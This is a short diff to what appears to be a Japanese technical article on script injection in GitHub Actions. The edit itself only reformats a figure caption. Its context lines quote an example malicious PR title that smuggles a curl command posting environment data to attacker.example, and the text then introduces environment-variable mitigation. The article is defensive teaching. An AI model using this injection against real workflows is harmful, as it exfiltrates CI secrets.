@@ -102,9 +102,7 @@ echo "PRのタイトル: a"; curl -X POST https://attacker.example/steal -d "$(p
 
 攻撃者が仕込んだ `curl` が実行され、環境変数（Secretsを含み得る）が外部に送信されます。**PRのタイトルは、フォークから誰でも自由に設定できる**ことを思い出してください。攻撃者はPRを1つ出すだけでいいのです。
 
-<Figure src="/images/marubatsu.png" alt="正しい方法と間違った方法の対比" width={180}>
-ユーザー入力を式で run に直接埋め込むのは「❌」。環境変数を経由するのが「⭕」
-</Figure>
+<Figure src="/images/marubatsu.png" alt="正しい方法と間違った方法の対比" caption="ユーザー入力を式で run に直接埋め込むのは「❌」。環境変数を経由するのが「⭕」" maxWidth="180px" />
 
 ### 対策: 環境変数を経由する
 
